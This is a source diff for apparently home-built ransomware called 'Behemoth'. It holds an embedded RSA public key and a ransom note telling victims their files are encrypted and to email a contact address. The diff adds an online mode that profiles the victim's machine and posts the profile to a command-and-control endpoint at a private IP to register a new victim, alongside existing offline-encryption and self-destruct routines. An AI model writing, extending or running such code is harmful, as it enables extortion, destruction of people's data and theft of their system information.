@@ -17,11 +17,14 @@
 #include "Helpers/create_readmes.h"
 #include "Helpers/self_dest.h"
 #include "Helpers/desktop_path.h"
+#include "Helpers/profiler.h"
+#include "Communication/sendrequest.h"
 
 
 const std::string PUBLIC_KEY = "MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAydGwvuurofZFGQD6mDYPjq4JJDLGjiSBREcqAhb/2+njKYcJw4yyJlicn/vhDpiwoar2tMK0Ry1tY44hWjbrVBYNM+dav8qiTj9KtHyI9iZwqmZNU9hhlpKcYiirCYhS9d4GqDBTe/GciueB5rcI/0s8UAtkrHprJLGWHFo1RgooJxRcKnxhOS3Em+PYsenlrLgeCKKMMzn896pG5J6SI7K+bamgTu9d6Xi01ZFtN5glIQGspZd0guJOkVN2Gf0Lp8Yq/KA9rGQv7G8SlyQbyssDPVDXz/5fHuYOVedlseFllkNKEqfCPcvgp/Jrmr3h4D3s8avhrzAP2wJUXqRR+YwFLYHkglJ/zVubPqgtAJrb5VnbZeMLhyILbfEV8CW8ydpYMsmSeWuSFDz7z9Bg7EE6EFCZ4qx6vIzgNg/GOMsUyyarztnf/N9T2QWXbcex6/+c34kNO3y8aay1xkK8AAvk8bkOBWIEDS7bvJ7c0CYkZZehqSCJ/vkr706Ye27HAgMBAAE=";
 const std::string OFF_README = "Your files has been encrypted with Behemoth ransomware.\n\nThe file hash for this executable is XXXXXXXXXXXXXXXXXXXXXXXXXXXX\n\nConstant us at constant@c0nstant.ca with the executable's hash to decrypt your files.\n";
-bool OFFLINE_ENC = true;
+bool OFFLINE_ENC = false;
+bool ONLINE_ENC = true;
 
 
 int offline_enc();
@@ -35,8 +38,27 @@ int main() {
         self_destruct();
     }
 
+    if (ONLINE_ENC) {
+        online_enc();
+    }
+
+
     return 0;
 }
+
+
+int online_enc() {
+    nlohmann::json profileJson = profiler(1337);
+    std::cout << profileJson.dump(4) << std::endl;
+
+    std::string response = sendrequest(L"https://10.0.0.113:5000/new-user", profileJson);
+    std::cout << response << std::endl;
+
+    return 0;
+}
+
+
+
 
 
 int offline_enc() {
